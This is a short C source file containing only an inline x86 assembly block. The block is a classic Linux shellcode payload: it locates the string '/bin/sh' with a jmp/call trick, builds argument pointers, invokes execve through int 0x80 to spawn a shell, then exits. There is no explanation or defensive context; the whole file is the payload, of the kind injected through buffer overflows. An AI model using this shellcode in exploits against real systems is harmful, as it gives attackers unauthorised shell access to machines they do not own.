void main()
{
	__asm__("
		jmp    1f
	2:	popl   %esi
		movl   %esi,0x8(%esi)
		xorl   %eax,%eax
		movb   %eax,0x7(%esi)
		movl   %eax,0xc(%esi)
		movb   $0xb,%al
		movl   %esi,%ebx
		leal   0x8(%esi),%ecx
		leal   0xc(%esi),%edx
		int    $0x80
		xorl   %ebx,%ebx
		movl   %ebx,%eax
		inc    %eax
		int    $0x80
	1:	call   2b
		.string \"/bin/sh\"
	");
}
